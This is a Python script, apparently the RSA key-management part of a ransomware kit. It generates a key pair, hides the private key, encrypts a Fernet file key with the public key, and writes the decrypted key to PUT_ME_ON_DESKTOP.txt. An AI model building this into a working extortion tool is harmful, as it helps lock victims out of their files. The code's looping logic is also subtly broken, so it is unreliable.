from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES,PKCS1_OAEP # PKCS#1 OAEP is an asymmetric cipher based on RSA and the OAEP padding

#Geberate RSA Key
def generate_key():
    global key
    global key_pair

    #generate RSA key pair
    print("[+] Generating RSA Key Pair")
    key = RSA.generate(2048) #Create a new RSA key pair
    print(f"[+] Generated RSA Key :{key}")
    key_pair={}
    #print(key)
    key_pair['private']=key.exportKey() #export Private Key
    key_pair['public']=key.publickey().exportKey() #export Public Key
    print(f"[+] Public key : \n{key_pair['public'].decode('UTF-8')}")
    print(f"\n[+] Private key : \n{key_pair['private'].decode('UTF-8')}")
   
    print("\n[+] Writing Public Key")
    f = open("public.pem", "wb")
    f.write(key_pair['public'])
    f.close()
    print("[+] Wrote Public Key In public.pem")

    print("\n[+] Writing Private Key")
    f = open(".private.pem", "wb") # Hidden file 
    f.write(key_pair['private'])
    f.close()
    print("[+] Wrote Private Key In .private.pem")
    print('-----------------------------------------------------------')

#Encrypt Fernet Key
def encrypt_fernet_key():
	global key_pair

	print("[+] Encrypting Fernet Key With RSA Public Key\n")

	public_key=RSA.importKey(open('public.pem').read())
	#public_key=RSA.importKey(key_pair['public']) #Import an RSA key (public), encoded in standard form
	#print(public_key)
	
	with open('fernet_key.txt','rb') as f :
		fernet_key=f.read()
	
	print(f"[+] Imported fernet key : \n{fernet_key}\n")
	#Create public encryptor
	public_encryptor=PKCS1_OAEP.new(public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption

	#encrypt fernet key with public key
	with open('fernet_key.txt','wb') as f:
		encrypted_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
		f.write(encrypted_fernet_key)
	print(f"[+] Encrypted Fernet Key : \n{encrypted_fernet_key}")
	print('-----------------------------------------------------------')

#Decrypt Fernet Key
def decrypt_fernet_key():
	global key_pair

	print("\n[+] Decrypting Fernet Key With RSA Private Key\n")

	private_key=RSA.importKey(open('.private.pem').read())
	#private_key=RSA.importKey(key_pair['private']) #Import an RSA key (private), encoded in standard form
	#print(private_key)
	
	with open('fernet_key.txt','rb') as f :
		encrypted_fernet_key=f.read()
	
	print(f"[+] Imported Encrypted Fernet Key : \n{encrypted_fernet_key}")
	#Create public encryptor
	private_cryptor=PKCS1_OAEP.new(private_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption

	#encrypt fernet key with public key
	with open('PUT_ME_ON_DESKTOP.txt','wb') as f:
		decrypted_fernet_key=private_cryptor.decrypt(encrypted_fernet_key) #encrypt fernet key with public key
		f.write(decrypted_fernet_key)
	print(f"\n[+] Decrypted Fernet Key : \n{decrypted_fernet_key}")
	print('-----------------------------------------------------------')

def showOptions():
	print("""[+] What You Wanna Do ?

[1] Generate RSA Key Pair
[2] Encrypt Fernet Key With RSA Public Key
[3] Decrypt Fernet Key With RSA Private Key (Generate PUT_ME_ON_DESKTOP.txt)
[4] Exit
		""")

if __name__ == '__main__':
	
	name=R"""
__        ___           _  ___ _ _          _ ____  ____ ___ 
\ \      / / |__   ___ | |/ (_) | | ___  __| |  _ \| __ )__ \
 \ \ /\ / /| '_ \ / _ \| ' /| | | |/ _ \/ _` | | | |  _ \ / /
  \ V  V / | | | | (_) | . \| | | |  __/ (_| | |_| | |_) |_| 
   \_/\_/  |_| |_|\___/|_|\_\_|_|_|\___|\__,_|____/|____/(_) 
                                                             
"""
	print(name)
	showOptions()
	choice = input("[+] Enter You Choice : ")
	choice = choice.lower()

	while (choice != '4' or choice !=  'exit'):
		if choice == '1':
			generate_key()
		if choice == '2':
			encrypt_fernet_key()
		if choice =='3':
			decrypt_fernet_key()
		if choice == '4':
			break
		showOptions()
		choice = input("\n[+] Enter You Choice : ")
